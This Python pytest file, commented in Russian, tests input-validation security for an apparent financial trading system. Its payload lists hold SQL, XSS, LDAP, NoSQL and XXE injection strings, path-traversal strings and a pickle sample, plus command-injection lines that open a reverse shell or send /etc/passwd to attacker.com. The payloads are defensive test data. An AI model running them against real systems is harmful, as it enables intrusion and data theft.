#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Comprehensive тесты безопасности и валидации данных.
Критически важно для финансовой системы - безопасность данных приоритет №1.
"""

import pytest
import re
import json
import hashlib
import secrets
from decimal import Decimal
from typing import Any, Dict, List, Union
from unittest.mock import patch, Mock

from domain.value_objects.money import Money
from domain.value_objects.price import Price
from domain.value_objects.currency import Currency
from domain.entities.order import Order, OrderSide, OrderType
from domain.entities.portfolio import Portfolio
from domain.exceptions import ValidationError, SecurityError, DataIntegrityError


class TestDataValidationSecurity:
    """Comprehensive тесты безопасности валидации данных."""

    def test_sql_injection_prevention(self) -> None:
        """Тест защиты от SQL injection атак."""
        malicious_inputs = [
            "'; DROP TABLE orders; --",
            "1' OR '1'='1",
            "'; SELECT * FROM users; --",
            "UNION SELECT password FROM admin",
            "<script>alert('xss')</script>",
            "' UNION SELECT creditCard FROM users --",
            "'; EXEC xp_cmdshell('format c:'); --"
        ]
        
        for malicious_input in malicious_inputs:
            # Тестируем что валидация отклоняет вредоносный ввод
            with pytest.raises(ValidationError):
                Currency(malicious_input)
            
            with pytest.raises(ValidationError):
                Order(
                    symbol=malicious_input,
                    side=OrderSide.BUY,
                    order_type=OrderType.MARKET,
                    quantity=Decimal("1")
                )

    def test_xss_prevention(self) -> None:
        """Тест защиты от XSS атак."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;"
        ]
        
        for xss_payload in xss_payloads:
            # Входные данные должны быть экранированы или отклонены
            with pytest.raises(ValidationError):
                Currency(xss_payload)
            
            # Проверяем что HTML теги удаляются/экранируются
            sanitized = self._sanitize_input(xss_payload)
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized

    def test_command_injection_prevention(self) -> None:
        """Тест защиты от command injection."""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script",
            "`whoami`",
            "$(curl malicious.com)",
            "; nc -e /bin/sh attacker.com 4444",
            "||(curl -d @/etc/passwd attacker.com)"
        ]
        
        for payload in command_injection_payloads:
            with pytest.raises(ValidationError):
                Currency(payload)
                
            # Проверяем что опасные символы фильтруются
            cleaned = self._clean_command_chars(payload)
            dangerous_chars = [";", "|", "&", "`", "$", "(", ")"]
            for dangerous_char in dangerous_chars:
                assert dangerous_char not in cleaned

    def test_path_traversal_prevention(self) -> None:
        """Тест защиты от path traversal атак."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for payload in path_traversal_payloads:
            with pytest.raises(ValidationError):
                # Предполагаем что есть поле для пути к файлу
                self._validate_file_path(payload)
            
            # Проверяем нормализацию пути
            normalized = self._normalize_path(payload)
            assert ".." not in normalized
            assert normalized.startswith("/allowed/path/")

    def test_ldap_injection_prevention(self) -> None:
        """Тест защиты от LDAP injection."""
        ldap_injection_payloads = [
            "*)(&(objectClass=*)",
            "*)(|(objectClass=*))",
            "admin)(&(password=*))",
            "*)(cn=*)(userPassword=*",
            "*))%00",
            "(cn=*))(|(cn=*"
        ]
        
        for payload in ldap_injection_payloads:
            # LDAP специальные символы должны экранироваться
            escaped = self._escape_ldap_input(payload)
            ldap_special_chars = ["(", ")", "*", "\\", "/", "\x00"]
            for char in ldap_special_chars:
                if char in payload:
                    assert f"\\{ord(char):02x}" in escaped or char not in escaped

    def test_nosql_injection_prevention(self) -> None:
        """Тест защиты от NoSQL injection."""
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.username == this.password"},
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"$or": [{"username": "admin"}, {"password": {"$exists": False}}]}
        ]
        
        for payload in nosql_payloads:
            # JSON payload должен валидироваться
            if isinstance(payload, dict):
                with pytest.raises(ValidationError):
                    self._validate_query_object(payload)

    def test_input_length_validation(self) -> None:
        """Тест валидации длины входных данных."""
        usd = Currency("USD")
        
        # Очень длинные строки
        very_long_string = "A" * 10000
        extremely_long_string = "B" * 1000000
        
        with pytest.raises(ValidationError):
            Currency(very_long_string)
        
        with pytest.raises(ValidationError):
            Currency(extremely_long_string)
        
        # Максимально допустимая длина
        max_length_string = "C" * 100  # Предполагаем макс 100 символов
        try:
            Currency(max_length_string)
        except ValidationError:
            # Может быть меньший лимит
            pass

    def test_numeric_input_validation(self) -> None:
        """Тест валидации численных входных данных."""
        usd = Currency("USD")
        
        # Экстремальные численные значения
        extreme_values = [
            "999999999999999999999999999999999999999",  # Очень большое число
            "-999999999999999999999999999999999999999", # Очень маленькое число
            "1e308",    # Близко к переполнению float
            "-1e308",   # Близко к переполнению float
            "0.00000000000000000000000000000000000001",  # Очень маленькое положительное
            "NaN",      # Not a Number
            "Infinity", # Бесконечность
            "-Infinity" # Отрицательная бесконечность
        ]
        
        for extreme_value in extreme_values:
            try:
                decimal_val = Decimal(extreme_value)
                with pytest.raises((ValidationError, OverflowError)):
                    Money(decimal_val, usd)
            except:
                # Decimal сам может отклонить значение
                pass

    def test_encoding_validation(self) -> None:
        """Тест валидации кодировок."""
        # Различные кодировки
        encoding_tests = [
            ("UTF-8", "Hello мир 🌍"),
            ("Latin-1", "Café résumé"),
            ("ASCII", "Hello World"),
        ]
        
        for encoding, test_string in encoding_tests:
            try:
                # Тестируем что строки правильно декодируются
                encoded = test_string.encode(encoding)
                decoded = encoded.decode(encoding)
                assert decoded == test_string
                
                # Проверяем валидацию
                Currency(decoded)
                
            except (UnicodeDecodeError, UnicodeEncodeError, ValidationError):
                # Некоторые кодировки могут не поддерживаться
                pass

    def test_unicode_normalization(self) -> None:
        """Тест Unicode нормализации."""
        import unicodedata
        
        # Строки с одинаковым визуальным представлением
        # но разными Unicode кодировками
        test_strings = [
            "café",      # Latin small letter e with acute
            "café",      # Latin small letter e + combining acute accent
            "Ἀρχή",      # Greek
            "Αρχή",      # Greek with different combining
        ]
        
        for test_string in test_strings:
            # Нормализуем в NFC форму
            normalized = unicodedata.normalize('NFC', test_string)
            
            # Проверяем что нормализованная строка принимается
            try:
                Currency(normalized)
            except ValidationError:
                # Может быть ограничение на Unicode символы
                pass

    def test_regex_injection_prevention(self) -> None:
        """Тест защиты от regex injection."""
        regex_injection_payloads = [
            ".*",           # Matches everything
            ".{0,99999}",   # ReDoS attack
            "(a+)+$",       # Catastrophic backtracking
            "a{99999}",     # Large repetition
            "(?=.*){99999}", # Complex lookahead
        ]
        
        for payload in regex_injection_payloads:
            # Regex паттерны должны валидироваться
            with pytest.raises(ValidationError):
                self._validate_regex_pattern(payload)

    def test_xml_injection_prevention(self) -> None:
        """Тест защиты от XML injection."""
        xml_injection_payloads = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/malicious.dtd'> %xxe;]>",
        ]
        
        for payload in xml_injection_payloads:
            # XML должен быть запрещен или строго валидирован
            with pytest.raises(ValidationError):
                self._validate_xml_input(payload)

    def test_buffer_overflow_prevention(self) -> None:
        """Тест защиты от buffer overflow."""
        # Создаем очень большие строки
        buffer_sizes = [1024, 4096, 8192, 16384, 65536]
        
        for size in buffer_sizes:
            large_input = "A" * size
            
            try:
                # Система должна ограничивать размер буфера
                with pytest.raises(ValidationError):
                    self._process_large_input(large_input)
            except MemoryError:
                # Ожидаемое поведение при исчерпании памяти
                pass

    def test_format_string_attack_prevention(self) -> None:
        """Тест защиты от format string атак."""
        format_string_payloads = [
            "%x%x%x%x%x%x%x%x",
            "%s%s%s%s%s%s%s%s",
            "%n%n%n%n%n%n%n%n",
            "%.1000d",
            "%99999c",
        ]
        
        for payload in format_string_payloads:
            # Format строки должны быть экранированы
            with pytest.raises(ValidationError):
                Currency(payload)

    def test_deserialization_attacks_prevention(self) -> None:
        """Тест защиты от атак десериализации."""
        malicious_serialized_data = [
            b'\x80\x03csubprocess\ncheck_output\nq\x00.',  # Python pickle
            '{"__reduce__": ["subprocess.check_output", [["whoami"]]]}',  # JSON
            b'\xac\xed\x00\x05sr\x00\x17java.util.HashMap',  # Java serialized
        ]
        
        for malicious_data in malicious_serialized_data:
            with pytest.raises((ValidationError, SecurityError)):
                self._safe_deserialize(malicious_data)

    def test_timing_attack_prevention(self) -> None:
        """Тест защиты от timing атак."""
        import time
        
        # Симулируем проверку паролей
        correct_password = "super_secret_password_123"
        timing_measurements = []
        
        test_passwords = [
            "wrong",
            "super",
            "super_secret",
            "super_secret_password",
            "super_secret_password_123",  # Правильный
            "super_secret_password_124",  # Почти правильный
        ]
        
        for password in test_passwords:
            start_time = time.perf_counter()
            result = self._constant_time_compare(password, correct_password)
            end_time = time.perf_counter()
            
            timing_measurements.append(end_time - start_time)
        
        # Все сравнения должны занимать примерно одинаковое время
        max_time = max(timing_measurements)
        min_time = min(timing_measurements)
        time_variance = (max_time - min_time) / max_time
        
        # Variance должна быть маленькой (< 10%)
        assert time_variance < 0.1

    def test_cryptographic_validation(self) -> None:
        """Тест криптографической валидации."""
        # Тестируем хеширование
        sensitive_data = "user_credit_card_1234567890123456"
        
        # Используем криптографически стойкий хеш
        hash_result = hashlib.sha256(sensitive_data.encode()).hexdigest()
        assert len(hash_result) == 64  # SHA-256 hash length
        
        # Тестируем генерацию случайных чисел
        random_token = secrets.token_urlsafe(32)
        assert len(random_token) >= 32
        
        # Проверяем что токены уникальны
        tokens = [secrets.token_urlsafe(32) for _ in range(100)]
        assert len(set(tokens)) == 100  # Все уникальны

    def test_input_sanitization(self) -> None:
        """Тест санитизации входных данных."""
        dirty_inputs = [
            "  whitespace around  ",
            "\n\r\tcontrol chars\n\r\t",
            "Mixed\x00Null\x00Bytes",
            "Unicode\u202enormal\u202c",  # Bidi override
            "HTML<b>tags</b>here",
        ]
        
        for dirty_input in dirty_inputs:
            cleaned = self._sanitize_input(dirty_input)
            
            # Проверяем что опасные элементы удалены
            assert "\x00" not in cleaned  # Null bytes
            assert "\u202e" not in cleaned  # Bidi override
            assert "<" not in cleaned or "&lt;" in cleaned  # HTML escaped
            
            # Пробелы должны быть обрезаны
            assert not cleaned.startswith(" ")
            assert not cleaned.endswith(" ")

    def test_rate_limiting_validation(self) -> None:
        """Тест валидации rate limiting."""
        # Симулируем множественные запросы
        request_count = 0
        max_requests = 100
        time_window = 60  # секунд
        
        def simulate_request():
            nonlocal request_count
            request_count += 1
            
            if request_count > max_requests:
                raise ValidationError("Rate limit exceeded")
            
            return "OK"
        
        # Делаем много запросов
        for i in range(150):
            if i < max_requests:
                result = simulate_request()
                assert result == "OK"
            else:
                with pytest.raises(ValidationError):
                    simulate_request()

    def test_data_integrity_validation(self) -> None:
        """Тест валидации целостности данных."""
        usd = Currency("USD")
        
        # Проверяем checksums
        original_data = Money(Decimal("1000.00"), usd)
        data_string = f"{original_data.amount}{original_data.currency.code}"
        checksum = hashlib.md5(data_string.encode()).hexdigest()
        
        # Симулируем передачу данных
        transmitted_data = original_data
        transmitted_checksum = hashlib.md5(
            f"{transmitted_data.amount}{transmitted_data.currency.code}".encode()
        ).hexdigest()
        
        # Checksums должны совпадать
        assert checksum == transmitted_checksum
        
        # Тестируем обнаружение изменений
        corrupted_data = Money(Decimal("1000.01"), usd)  # Изменена сумма
        corrupted_checksum = hashlib.md5(
            f"{corrupted_data.amount}{corrupted_data.currency.code}".encode()
        ).hexdigest()
        
        assert checksum != corrupted_checksum

    # Вспомогательные методы для тестов
    def _sanitize_input(self, input_string: str) -> str:
        """Санитизация входной строки."""
        # Удаляем null bytes
        cleaned = input_string.replace('\x00', '')
        
        # Удаляем bidi override символы
        cleaned = cleaned.replace('\u202e', '').replace('\u202c', '')
        
        # Экранируем HTML
        html_escape_table = {
            "&": "&amp;",
            '"': "&quot;",
            "'": "&#x27;",
            ">": "&gt;",
            "<": "&lt;",
        }
        for char, escape in html_escape_table.items():
            cleaned = cleaned.replace(char, escape)
        
        # Обрезаем пробелы
        cleaned = cleaned.strip()
        
        return cleaned

    def _clean_command_chars(self, input_string: str) -> str:
        """Удаление опасных символов команд."""
        dangerous_chars = [";", "|", "&", "`", "$", "(", ")", "<", ">"]
        cleaned = input_string
        for char in dangerous_chars:
            cleaned = cleaned.replace(char, "")
        return cleaned

    def _normalize_path(self, path: str) -> str:
        """Нормализация пути для предотвращения path traversal."""
        import os.path
        # Убираем path traversal последовательности
        normalized = path.replace("..", "").replace("\\", "/")
        # Добавляем безопасный префикс
        safe_path = "/allowed/path/" + normalized.lstrip("/")
        return safe_path

    def _escape_ldap_input(self, input_string: str) -> str:
        """Экранирование LDAP специальных символов."""
        escapes = {
            '*': '\\2a',
            '(': '\\28',
            ')': '\\29',
            '\\': '\\5c',
            '\x00': '\\00',
            '/': '\\2f'
        }
        
        escaped = input_string
        for char, escape in escapes.items():
            escaped = escaped.replace(char, escape)
        
        return escaped

    def _validate_query_object(self, query: dict) -> bool:
        """Валидация объекта запроса для предотвращения NoSQL injection."""
        dangerous_operators = ['$ne', '$gt', '$lt', '$regex', '$where', '$or', '$and']
        
        def check_recursive(obj):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    if key.startswith('$') and key in dangerous_operators:
                        raise ValidationError(f"Dangerous operator: {key}")
                    check_recursive(value)
            elif isinstance(obj, list):
                for item in obj:
                    check_recursive(item)
        
        check_recursive(query)
        return True

    def _validate_file_path(self, path: str) -> bool:
        """Валидация пути к файлу."""
        if ".." in path or path.startswith("/"):
            raise ValidationError("Invalid file path")
        return True

    def _validate_regex_pattern(self, pattern: str) -> bool:
        """Валидация regex паттерна."""
        dangerous_patterns = [".*", ".+", ".{", "(?=.*)", "(.*)+"]
        for dangerous in dangerous_patterns:
            if dangerous in pattern:
                raise ValidationError("Dangerous regex pattern")
        return True

    def _validate_xml_input(self, xml_string: str) -> bool:
        """Валидация XML входа."""
        if "<!DOCTYPE" in xml_string or "<!ENTITY" in xml_string:
            raise ValidationError("XML entities not allowed")
        return True

    def _process_large_input(self, input_data: str) -> bool:
        """Обработка больших входных данных."""
        max_size = 1024  # 1KB limit
        if len(input_data) > max_size:
            raise ValidationError("Input too large")
        return True

    def _safe_deserialize(self, data: bytes) -> Any:
        """Безопасная десериализация."""
        # Проверяем магические байты
        dangerous_headers = [
            b'\x80\x03',  # Python pickle
            b'\xac\xed',  # Java serialized
        ]
        
        for header in dangerous_headers:
            if data.startswith(header):
                raise SecurityError("Dangerous serialization format")
        
        return True

    def _constant_time_compare(self, a: str, b: str) -> bool:
        """Сравнение строк за константное время."""
        import hmac
        return hmac.compare_digest(a.encode(), b.encode())